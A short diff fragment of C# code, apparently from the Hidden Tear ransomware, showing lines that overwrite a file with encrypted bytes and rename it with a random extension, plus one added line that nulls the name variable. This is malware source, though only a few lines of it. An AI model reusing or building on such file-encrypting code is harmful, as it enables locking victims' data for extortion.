@@ -127,6 +127,7 @@ namespace hidden_tear
 
             File.WriteAllBytes(file, bytesEncrypted);
             System.IO.File.Move(file, file + "." + filerandomname);
+            filerandomname = null;
 
 
 
